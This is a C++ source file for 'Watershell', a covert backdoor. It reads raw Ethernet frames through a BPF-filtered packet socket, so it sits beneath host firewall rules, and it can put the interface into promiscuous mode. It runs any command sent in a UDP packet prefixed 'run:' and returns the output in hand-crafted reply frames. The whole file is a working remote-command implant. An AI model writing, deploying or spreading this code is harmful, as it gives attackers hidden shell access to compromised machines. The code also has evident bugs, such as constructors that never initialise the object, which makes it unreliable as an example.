#include "watershell.h"

// Constructor
Watershell::Watershell(int port) {
  Watershell(port, false);
}
Watershell::Watershell(int port, bool DEBUG) {
  Watershell(port, DEBUG, false);
}
Watershell::Watershell(int port, bool DEBUG, bool PROMISC) {
  this->port = port;
  this->DEBUG = DEBUG;
  this->PROMISC = PROMISC;

  memset(this->iface, '\0', sizeof(this->iface));
  this->GetInterfaceName(this->iface);

  /* BPF code generated with tcpdump -dd udp and port 12345
   * used to filter incoming packets at the socket level
   */
  struct sock_filter bpf_code[] = {
      { 0x28, 0, 0, 0x0000000c },
      { 0x15, 0, 6, 0x000086dd },
      { 0x30, 0, 0, 0x00000014 },
      { 0x15, 0, 15, 0x00000011 },
      { 0x28, 0, 0, 0x00000036 },
      { 0x15, 12, 0, 0x00003039 }, //5
      { 0x28, 0, 0, 0x00000038 },
      { 0x15, 10, 11, 0x00003039 }, //7
      { 0x15, 0, 10, 0x00000800 },
      { 0x30, 0, 0, 0x00000017 },
      { 0x15, 0, 8, 0x00000011 },
      { 0x28, 0, 0, 0x00000014 },
      { 0x45, 6, 0, 0x00001fff },
      { 0xb1, 0, 0, 0x0000000e },
      { 0x48, 0, 0, 0x0000000e },
      { 0x15, 2, 0, 0x00003039 }, //15
      { 0x48, 0, 0, 0x00000010 },
      { 0x15, 0, 1, 0x00003039 }, //17
      { 0x6, 0, 0, 0x0000ffff },
      { 0x6, 0, 0, 0x00000000 },
  };

  bpf_code[5].k = this->port;
  bpf_code[7].k = this->port;
  bpf_code[15].k = this->port;
  bpf_code[17].k = this->port;

  /* startup a raw socket, gets raw ethernet frames containing IP packets
   * directly from the interface, none of this AF_INET shit
   */
  this->sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
  if (this->sockfd < 0){
      if (this->DEBUG) std::perror("socket");
      exit(1);
  }

  /* setup ifreq struct and SIGINT handler
   * make sure we can issue an ioctl to the interface
   */
  this->sifreq = (ifreq *)malloc(sizeof(struct ifreq));
  // std::signal(SIGINT, this->Sigint);
  std::strncpy(this->sifreq->ifr_name, this->iface, IFNAMSIZ);
  if (ioctl(this->sockfd, SIOCGIFFLAGS, this->sifreq) == -1){
      if (this->DEBUG) std::perror("ioctl SIOCGIFFLAGS");
      close(this->sockfd);
      free(this->sifreq);
      exit(0);
  }

  //set up promisc mode if enabled
  if (this->PROMISC){
      this->sifreq->ifr_flags |= IFF_PROMISC;
      if (ioctl(this->sockfd, SIOCSIFFLAGS, this->sifreq) == -1)
          if (this->DEBUG) std::perror("ioctl SIOCSIFFLAGS");
  }

  //apply the packet filter code to the socket
  this->filter.len = 20;
  this->filter.filter = bpf_code;
  if (setsockopt(this->sockfd, SOL_SOCKET, SO_ATTACH_FILTER,
                 &(this->filter), sizeof(this->filter)) < 0)
      if (this->DEBUG) std::perror("setsockopt");
}

int Watershell::RunOnce() {
  int n;
  unsigned char buf[2048];
  char *udpdata;
  struct iphdr *ip;
  struct udphdr *udp;


  memset(buf, 0, 2048);
  //get a packet, and tear it apart, look for keywords
  n = recvfrom(this->sockfd, buf, 2048, 0, NULL, NULL);
  ip = (struct iphdr *)(buf + sizeof(struct ethhdr));
  udp = (struct udphdr *)(buf + ip->ihl*4 + sizeof(struct ethhdr));
  udpdata = (char *)((buf + ip->ihl*4 + 8 + sizeof(struct ethhdr)));


  //checkup on the service, make sure it is still there
  if(!std::strncmp(udpdata, "status:", 7)){
    this->SendReply(buf, (unsigned char *)"up");
  }

  //run a command if the data is prefixed with run:
  if (!std::strncmp(udpdata, "run:", 4)){
      int out = open("/dev/null", O_WRONLY);
      int err = open("/dev/null", O_WRONLY);
      dup2(out, 0);
      dup2(err, 2);

      FILE *fd;
      fd = popen(udpdata + 4, "r");
      if (!fd) return -1;

      char buffer[256];
      size_t chread;
      /* String to store entire command contents in */
      size_t comalloc = 256;
      size_t comlen   = 0;
      unsigned char *comout   = (unsigned char *)malloc(comalloc);

      /* Use fread so binary data is dealt with correctly */
      while ((chread = fread(buffer, 1, sizeof(buffer), fd)) != 0) {
          if (comlen + chread >= comalloc) {
              comalloc *= 2;
              comout = (unsigned char *)realloc(comout, comalloc);
          }
          memmove(comout + comlen, buffer, chread);
          comlen += chread;
      }

      pclose(fd);
      this->SendReply(buf, comout);
  }
}

void Watershell::GetInterfaceName(char iface[]){
  const char* google_dns_server = "8.8.8.8";
  int dns_port = 53;
  int sock, err;

  char buf[32];
  char buffer[100];

  struct ifaddrs *addrs, *iap;
  struct sockaddr_in *sa;
  struct sockaddr_in serv;
  struct sockaddr_in name;



  sock = socket(AF_INET, SOCK_DGRAM, 0);

  memset(&serv, 0, sizeof(serv));
  serv.sin_family = AF_INET;
  serv.sin_addr.s_addr = inet_addr(google_dns_server);
  serv.sin_port = htons(dns_port);

  err = connect(sock ,(const struct sockaddr*) &serv ,sizeof(serv));


  socklen_t namelen = sizeof(name);
  err = getsockname(sock, (struct sockaddr*) &name, &namelen);


  const char* p = inet_ntop(AF_INET, &name.sin_addr, buffer, 100);

  getifaddrs(&addrs);
  for (iap = addrs; iap != NULL; iap = iap->ifa_next) {
      if (iap->ifa_addr && (iap->ifa_flags & IFF_UP) && iap->ifa_addr->sa_family == AF_INET) {
          sa = (struct sockaddr_in *)(iap->ifa_addr);
          inet_ntop(iap->ifa_addr->sa_family, (void *)&(sa->sin_addr), buf, sizeof(buf));
          if (!strcmp(p, buf)) {
              strncpy(iface, iap->ifa_name, strlen(iap->ifa_name));
              //interface_name = iap->ifa_name;
              break;
          }
      }
  }

  freeifaddrs(addrs);
  close(sock);
}

void Watershell::SendReply(unsigned char *buf, unsigned char *payload){
  struct udpframe frame;
  struct sockaddr_ll saddrll;
  struct sockaddr_in sin;
  int len;

  //setup the data
  std::memset(&frame, 0, sizeof(frame));
  std::memcpy(frame.data, payload, std::strlen((char *)payload));

  //get the ifindex
  if (ioctl(this->sockfd, SIOCGIFINDEX, this->sifreq) == -1){
    if (this->DEBUG){
      std::perror("ioctl SIOCGIFINDEX");
    }
    return;
  }

  //layer 2
  saddrll.sll_family = PF_PACKET;
  saddrll.sll_ifindex = this->sifreq->ifr_ifindex;
  saddrll.sll_halen = ETH_ALEN;
  std::memcpy((void*)saddrll.sll_addr, (void*)(((struct ethhdr*)buf)->h_source), ETH_ALEN);
  std::memcpy((void*)frame.ehdr.h_source, (void*)(((struct ethhdr*)buf)->h_dest), ETH_ALEN);
  std::memcpy((void*)frame.ehdr.h_dest, (void*)(((struct ethhdr*)buf)->h_source), ETH_ALEN);
  frame.ehdr.h_proto = htons(ETH_P_IP);

  //layer 3
  frame.ip.version = 4;
  frame.ip.ihl = sizeof(frame.ip)/4;
  frame.ip.id = htons(69);
  frame.ip.frag_off |= htons(IP_DF);
  frame.ip.ttl = 64;
  frame.ip.tos = 0;
  frame.ip.tot_len = htons(sizeof(frame.ip) + sizeof(frame.udp) + std::strlen((char *)payload));
  frame.ip.saddr = ((struct iphdr*)(buf+sizeof(struct ethhdr)))->daddr;
  frame.ip.daddr = ((struct iphdr*)(buf+sizeof(struct ethhdr)))->saddr;
  frame.ip.protocol = IPPROTO_UDP;

  //layer 4
  frame.udp.source = ((struct udphdr*)(buf+sizeof(struct ethhdr)+sizeof(struct iphdr)))->dest;
  frame.udp.dest = ((struct udphdr*)(buf+sizeof(struct ethhdr)+sizeof(struct iphdr)))->source;
  frame.udp.len = htons(strlen((char *)payload) + sizeof(frame.udp));


  //checksumsstrncpy
  //udp_checksum(&frame.ip, (unsigned short*)&frame.udp);
  this->CalcIPChecksum(&frame.ip);

  //calculate total length and send
  len = sizeof(struct ethhdr) + sizeof(struct udphdr) + sizeof(struct iphdr) + std::strlen((char *)payload);
  sendto(this->sockfd, (char*)&frame, len, 0, (struct sockaddr *)&saddrll, sizeof(saddrll));
}

// Watershell::Sigint(int signum){
//   //if promiscuous mode was on, turn it off
//   if (this->PROMISC){
//       if (ioctl(this->sockfd, SIOCGIFFLAGS, this->sifreq) == -1){
//           if (this->DEBUG) std::perror("ioctl GIFFLAGS");
//       }
//       sifreq->ifr_flags ^= IFF_PROMISC;
//       if (ioctl(this->sockfd, SIOCSIFFLAGS, this->sifreq) == -1){
//           if (this->DEBUG) std::perror("ioctl SIFFLAGS");
//       }
//   }
//   //shut it down!
//   free(this->sifreq);
//   close(this->sockfd);
//   //exit(1);
// }

void Watershell::CalcIPChecksum(struct iphdr *ip){
  unsigned int count = ip->ihl<<2;
  unsigned short *addr = (unsigned short*)ip;
  register unsigned long sum = 0;

  ip->check = 0;
  while (count > 1){
      sum += *addr++;
      count -= 2;
  }
  if (count > 0)
      sum += ((*addr) & htons(0xFFFF));
  while (sum>>16)
      sum = (sum & 0xFFFF) + (sum >>16);
  sum = ~sum;
  ip->check = (unsigned short)sum;
}
